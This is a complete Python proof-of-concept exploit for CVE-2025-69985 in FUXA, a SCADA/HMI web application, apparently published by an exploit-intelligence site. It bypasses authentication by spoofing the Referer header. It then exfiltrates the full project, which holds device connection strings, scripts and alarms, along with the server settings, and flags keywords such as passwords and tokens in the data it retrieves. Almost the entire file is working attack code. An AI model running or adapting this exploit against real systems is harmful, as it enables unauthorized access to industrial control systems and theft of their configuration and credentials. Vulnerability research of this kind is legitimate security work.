#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : FUXA <= 1.2.8 Data Exfiltration via Auth Bypass
# CVE            : CVE-2025-69985
# Vendor         : frangoteam
# Product        : FUXA
# Affected       : All versions <= 1.2.8 (through v1.2.11 / latest)
# Type           : CWE-288 - Authentication Bypass Using Alternate Path
# CVSS           : 9.8 (Critical)
# Platform       : Node.js / Docker
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC Vector 2 for CVE-2025-69985: Data Exfiltration via /api/project

Demonstrates that the authentication bypass in FUXA <= 1.2.8 extends beyond
the /api/runscript endpoint. The /api/project endpoint exposes the entire
FUXA project including SCADA/HMI configurations, device connection strings,
script definitions, and alarm definitions.

ATTACK CHAIN:
  1. Spoof Referer header to bypass requireAuth
  2. GET /api/project to retrieve the full project data
  3. GET /api/settings to retrieve server configuration
  4. Extract device configs, scripts, and other sensitive data

PREREQUISITES:
  - Network access to FUXA instance on port 1881
  - Python 3 (stdlib only)

REFERENCES:
  - CVE-2025-69985 / GHSA-4r4r-4jp4-wwf9
  - https://nvd.nist.gov/vuln/detail/CVE-2025-69985
"""

import sys
import json
import http.client


DEFAULT_HOST = "172.19.0.4"
DEFAULT_PORT = 1881


def exfiltrate_project(target_host, target_port):
    """
    Retrieve the full FUXA project data via /api/project.

    The /api/project endpoint is protected by verifyApiOrToken middleware
    (server/api/apikeys/verify-api-or-token.js). When secureEnabled=false (default)
    or when verifyToken auto-generates a guest token, requests pass through
    without authentication.

    The Referer bypass additionally allows this even when requireAuth is active.
    """
    referer = f"http://{target_host}:{target_port}/fuxa"

    headers = {
        "Content-Type": "application/json",
        "Referer": referer,
    }

    print(f"[*] Target: http://{target_host}:{target_port}")
    print(f"[*] Referer: {referer}")
    print(f"[*] Sending GET /api/project ...")

    try:
        conn = http.client.HTTPConnection(target_host, target_port, timeout=15)
        conn.request("GET", "/api/project", headers=headers)
        response = conn.getresponse()
        status = response.status
        raw = response.read().decode("utf-8", errors="replace")
        conn.close()
    except Exception as e:
        print(f"[-] Request failed: {type(e).__name__}: {e}")
        return False

    print(f"[*] HTTP Status: {status}")

    if status == 200:
        print(f"[+] SUCCESS - Project data exfiltrated via CVE-2025-69985!")
        print(f"[+] Response size: {len(raw)} bytes")
        print()

        # Parse and summarize the project data
        try:
            data = json.loads(raw)
        except json.JSONDecodeError:
            print(f"[!] Response is not valid JSON (may be empty project)")
            print(f"    Raw: {raw[:500]}")
            return True  # Still a successful exfiltration (auth bypass worked)

        # Enumerate project contents
        print("=" * 60)
        print("  EXFILTRATED PROJECT DATA SUMMARY")
        print("=" * 60)

        if isinstance(data, dict):
            for key, value in data.items():
                if isinstance(value, dict):
                    print(f"  [{key}] -> {len(value)} items")
                    # Show first few sub-keys
                    for i, subkey in enumerate(list(value.keys())[:5]):
                        print(f"    - {subkey}")
                    if len(value) > 5:
                        print(f"    ... and {len(value) - 5} more")
                elif isinstance(value, list):
                    print(f"  [{key}] -> {len(value)} entries")
                elif isinstance(value, str):
                    print(f"  [{key}] -> \"{value[:80]}{'...' if len(str(value)) > 80 else ''}\"")
                else:
                    print(f"  [{key}] -> {value}")

        print("=" * 60)

        # Check for sensitive data
        raw_lower = raw.lower()
        sensitive_keywords = ["password", "secret", "token", "apikey", "modbus",
                              "opcua", "bacnet", "mqtt", "s7comm", "credential"]
        found_sensitive = [kw for kw in sensitive_keywords if kw in raw_lower]
        if found_sensitive:
            print()
            print("[!] Sensitive keywords found in project data:")
            for kw in found_sensitive:
                print(f"    - {kw}")

        return True

    elif status == 401:
        print(f"[-] FAILED - Authentication required (bypass did not work)")
        return False
    else:
        print(f"[-] Unexpected response: HTTP {status}")
        print(f"    Response: {raw[:500]}")
        return False


def exfiltrate_settings(target_host, target_port):
    """
    Attempt to read server settings via /api/settings.

    Exposes security configuration, secret codes, token settings, etc.
    Protected by the same weak auth middleware.
    """
    referer = f"http://{target_host}:{target_port}/fuxa"

    headers = {
        "Content-Type": "application/json",
        "Referer": referer,
    }

    print()
    print(f"[*] Sending GET /api/settings ...")

    try:
        conn = http.client.HTTPConnection(target_host, target_port, timeout=15)
        conn.request("GET", "/api/settings", headers=headers)
        response = conn.getresponse()
        status = response.status
        raw = response.read().decode("utf-8", errors="replace")
        conn.close()
    except Exception as e:
        print(f"[-] Request failed: {type(e).__name__}: {e}")
        return False

    print(f"[*] HTTP Status: {status}")

    if status == 200:
        print(f"[+] SUCCESS - Settings exfiltrated!")
        print(f"[+] Response size: {len(raw)} bytes")

        try:
            settings = json.loads(raw)
            print()
            print("=" * 60)
            print("  SERVER SETTINGS")
            print("=" * 60)
            for key, value in settings.items():
                # Redact actual secret values but show keys
                if "secret" in key.lower() or "password" in key.lower():
                    print(f"  {key}: [REDACTED - {len(str(value))} chars]")
                else:
                    print(f"  {key}: {value}")
            print("=" * 60)
        except json.JSONDecodeError:
            print(f"    Raw response: {raw[:500]}")

        return True
    else:
        print(f"[-] Settings endpoint returned HTTP {status}")
        return False


def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="CVE-2025-69985 Vector 2: Data Exfiltration via /api/project & /api/settings"
    )
    parser.add_argument("-t", "--target", default=DEFAULT_HOST,
                        help=f"Target host (default: {DEFAULT_HOST})")
    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT,
                        help=f"Target port (default: {DEFAULT_PORT})")

    args = parser.parse_args()

    print()
    print("=" * 60)
    print("  CVE-2025-69985 Vector 2: Data Exfiltration")
    print("  Unauthenticated access to /api/project & /api/settings")
    print("=" * 60)
    print()

    success_project = exfiltrate_project(args.target, args.port)
    success_settings = exfiltrate_settings(args.target, args.port)

    print()
    print("=" * 60)
    print("  SUMMARY")
    print("=" * 60)
    print(f"  /api/project:  {'EXFILTRATED' if success_project else 'FAILED'}")
    print(f"  /api/settings: {'EXFILTRATED' if success_settings else 'FAILED'}")
    print("=" * 60)

    sys.exit(0 if (success_project or success_settings) else 1)


if __name__ == "__main__":
    main()
